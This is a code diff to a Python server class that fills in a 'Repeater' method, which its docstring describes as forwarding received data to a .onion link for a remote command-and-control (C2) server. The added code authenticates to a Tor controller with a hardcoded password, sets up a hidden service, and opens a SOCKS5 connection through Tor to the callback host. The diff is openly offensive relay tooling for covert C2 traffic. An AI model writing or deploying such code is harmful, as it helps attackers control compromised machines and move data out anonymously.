@@ -1,5 +1,6 @@
 from utils.Log import Log
 from Src.Route import Route
+from socks import setdefaultproxy, socksocket, PROXY_TYPE_SOCKS5
 from socket import socket, AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR, SHUT_RDWR
 
 '''
@@ -15,6 +16,7 @@ class SVR:
     '''
     def __init__(self, PORT):
         self.PORT = PORT
+        self.TPORT = 9050
         self.log = Log()
         self.blackList = []
         self.connections = {}
@@ -90,11 +92,25 @@ class SVR:
     '''
         Forwards received data to a specified .onion link 
         for a remote C2.
-        @param URL: .onion link .
+        @param URL: .onion link for the callback server.
+        @return: An established connection through tor with the callback server.
     '''
     def Repeater(self, URL):
-        return 1
+        callback = ''
 
+        with self.route.createController() as controller:
+            controller.authenticate(password = 'Richard')
+            hostname = self.route.setUpService(controller)
 
+            if hostname:
+                setdefaultproxy(PROXY_TYPE_SOCKS5, "127.0.0.1", self.TPORT, True)
+                callback = socksocket()
+                try:
+                    callback.connect((URL, self.route.r_PORT))
+                except Exception as e:
+                    error = str(e)
+                    self.log.addToErrorLog("Unable to establish a connection with the callback server.\n{}".format(error))
+                    exit(1)
 
+        return callback
 
